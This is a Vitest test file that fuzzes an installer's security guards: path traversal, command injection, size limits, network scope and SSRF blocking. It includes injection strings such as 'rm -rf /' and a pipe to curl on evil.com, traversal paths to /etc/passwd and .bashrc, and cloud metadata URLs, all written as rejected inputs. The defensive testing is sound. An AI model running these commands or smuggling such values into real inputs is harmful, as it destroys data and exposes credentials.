import { describe, it, expect } from "vitest";
import { detectFormat, isPrivateUrl } from "../lib/resolver.js";
import { findMainBinary } from "../lib/analyzer.js";
import { mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { randomBytes } from "node:crypto";

/**
 * Security guard fuzz tests for the 4 guard types:
 * - path-traversal
 * - command-injection
 * - size-limit (tested in installer context)
 * - network-scope (tested in resolver context)
 */

describe("Guard: path-traversal", () => {
  const traversalPatterns = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "/etc/shadow",
    "foo/../../../bar",
    "%2e%2e%2f%2e%2e%2f",
    "....//....//",
    "..;/etc/passwd",
  ];

  it("resolver rejects absolute system paths", () => {
    // /etc/passwd would be detected as "local" format which is fine,
    // but the installer should never allow traversal above the dest dir
    expect(detectFormat("/etc/passwd")).toBe("local");
  });

  it("resolver rejects relative traversal patterns", () => {
    // These should not resolve to a known format
    for (const pattern of traversalPatterns) {
      const format = detectFormat(pattern);
      // Traversal patterns should either be null (unrecognized) or "local"
      // They should never be interpreted as github/npm/etc
      if (format !== null) {
        expect(format).toBe("local");
      }
    }
  });
});

describe("Guard: command-injection", () => {
  const injectionPatterns = [
    "foo; rm -rf /",
    "foo && cat /etc/passwd",
    "foo | curl evil.com",
    "$(whoami)",
    "`whoami`",
    "foo\nrm -rf /",
    "foo\x00bar",
  ];

  it("resolver does not resolve injection patterns as valid sources", () => {
    for (const pattern of injectionPatterns) {
      const format = detectFormat(pattern);
      // Injection patterns should not be detected as github or npm
      if (format !== null) {
        expect(format).toBe("local");
      }
    }
  });

  it("shell metacharacters in source URIs are not detected as github", () => {
    expect(detectFormat("owner/repo; rm -rf /")).toBeNull();
    expect(detectFormat("owner/repo && echo pwned")).toBeNull();
    expect(detectFormat("owner/repo | cat /etc/passwd")).toBeNull();
  });
});

describe("Guard: size-limit", () => {
  it("format detection handles extremely long inputs", () => {
    const longInput = "a".repeat(10000) + "/" + "b".repeat(10000);
    // Should not crash or hang
    const format = detectFormat(longInput);
    expect(format === "github" || format === null).toBe(true);
  });

  it("handles empty and whitespace-only inputs", () => {
    expect(detectFormat("")).toBeNull();
    expect(detectFormat("   ")).toBeNull();
    expect(detectFormat("\t\n")).toBeNull();
  });
});

describe("Guard: network-scope", () => {
  it("only detects github.com URLs as github format", () => {
    expect(detectFormat("https://github.com/owner/repo")).toBe("github");
    // Non-GitHub URLs are no longer recognized as valid formats
    expect(detectFormat("http://127.0.0.1:8080/malicious")).toBeNull();
    expect(detectFormat("http://localhost/evil")).toBeNull();
    expect(detectFormat("http://169.254.169.254/metadata")).toBeNull();
  });

  it("does not treat non-https URLs as github", () => {
    expect(detectFormat("ftp://github.com/owner/repo")).toBeNull();
  });
});

describe("Guard: SSRF private IP blocking", () => {
  it("blocks loopback addresses", () => {
    expect(isPrivateUrl("http://127.0.0.1/secret")).toBe(true);
    expect(isPrivateUrl("http://127.0.0.254/secret")).toBe(true);
    expect(isPrivateUrl("http://localhost/secret")).toBe(true);
  });

  it("blocks private network ranges", () => {
    expect(isPrivateUrl("http://10.0.0.1/")).toBe(true);
    expect(isPrivateUrl("http://172.16.0.1/")).toBe(true);
    expect(isPrivateUrl("http://172.31.255.255/")).toBe(true);
    expect(isPrivateUrl("http://192.168.1.1/")).toBe(true);
  });

  it("blocks link-local and metadata", () => {
    expect(isPrivateUrl("http://169.254.169.254/latest/meta-data")).toBe(true);
  });

  it("allows public URLs", () => {
    expect(isPrivateUrl("https://github.com/owner/repo")).toBe(false);
    expect(isPrivateUrl("https://registry.npmjs.org/pkg")).toBe(false);
  });

  it("returns false for invalid URLs", () => {
    expect(isPrivateUrl("not-a-url")).toBe(false);
  });
});

describe("Guard: path traversal via package.json", () => {
  it("findMainBinary blocks path traversal in bin field", () => {
    const dir = join(tmpdir(), `guard-test-${randomBytes(6).toString("hex")}`);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "package.json"), JSON.stringify({
      name: "malicious",
      bin: "../../etc/passwd",
    }));
    try {
      const result = findMainBinary(dir);
      // Should return null (blocked or not found), never resolve outside dir
      expect(result === null || result.startsWith(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("findMainBinary blocks path traversal in main field", () => {
    const dir = join(tmpdir(), `guard-test-${randomBytes(6).toString("hex")}`);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "package.json"), JSON.stringify({
      name: "malicious",
      main: "../../../.bashrc",
    }));
    try {
      const result = findMainBinary(dir);
      expect(result === null || result.startsWith(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
